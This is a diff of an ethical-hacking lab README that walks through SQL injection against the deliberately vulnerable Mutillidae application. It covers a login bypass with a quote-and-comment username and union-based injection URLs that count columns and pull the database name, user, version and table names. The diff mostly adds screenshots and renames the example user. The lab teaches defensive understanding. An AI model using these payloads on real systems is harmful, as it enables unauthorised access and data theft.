@@ -103,14 +103,17 @@ Alright. Now is time to test if we managed to fix the database issue. Go ahead a
 
  The Mutillidae database error no longer appears 
 
-![Uploading image.png…]()
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/4028dccb-ecec-4f4a-b25c-2bd19b6d3d22)
 
 ===============================================================
 
 Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password. 
 
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/7bf8cf88-6360-4e1a-a1a7-2c75881bb738)
+
 Click the login button and you will see it enter into the administrator page.
 
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/a9f7e5f3-eb15-47ca-aef6-c9f11ddd7e6d)
 
 ## Union-based SQL injection
 
@@ -120,9 +123,14 @@ we will be using the “User Info” page from Mutillidae to perform a Union-Bas
 After logging out, Now choose the menu as shown below:
 
 
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/02128a12-ab7a-49a9-937f-9247c2b2d381)
+
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/56f0e633-2e7b-412c-b0ec-e997f832dd8b)
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/72aea5ad-761f-430d-b45d-302d80fac7d8)
 
 
-
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/498a6384-e743-4172-b3ba-6d77ccbb90ea)
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/f31ea331-33c2-440c-b84a-fcf7cc8b1b5c)
 
 
 
@@ -130,6 +138,7 @@ From this point, all our attack vectors will be performed in the URL section of 
 
 
 
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/204b1824-276f-4a79-8b54-854db04b0ea0)
 
 
 
@@ -138,27 +147,37 @@ Since we do not know the number of columns, we start at 1. To find the exact amo
 
 The browser url of this info page need to be modified with the url as below:
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=robinson%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
 
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/4ce331d4-991c-4386-836f-9ec288826e97)
 
 
 After adding the order by 6 into the existing url , the following error statement will be obtained:
 
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/56faefeb-442f-414c-8b83-f7a0d7586a6b)
+
 
 When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
 
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/21a6ba06-2f95-4a1a-b33f-62526582c9f5)
 
  As it is having 5 columns the query worked fine and it provides the correct result
 
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/76136de5-bf6e-404d-be18-29c128291557)
 
 Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).
 
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/413d5c64-727f-4fd3-87c4-55a9895fefed)
+
 As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
 
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/8efccd5e-3629-4a0e-b974-a7d8d1907637)
 
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
+
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/d69b786b-122e-4676-99df-ed71d08c2075)
 
 
 The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
@@ -168,7 +187,9 @@ Replace the query in the url with the following one:
 union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=ganesh%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
+http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=robinson%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
+
+![image](https://github.com/CodesWithRobi/EH-LAB08-SQL-Injection/assets/130537166/58164b10-70cf-4180-8808-1170e8ca8bd1)
 
 The url once executed will  retrieve table names from the “owasp 10” database.
 ##Extracting sensitive data such as passwords 
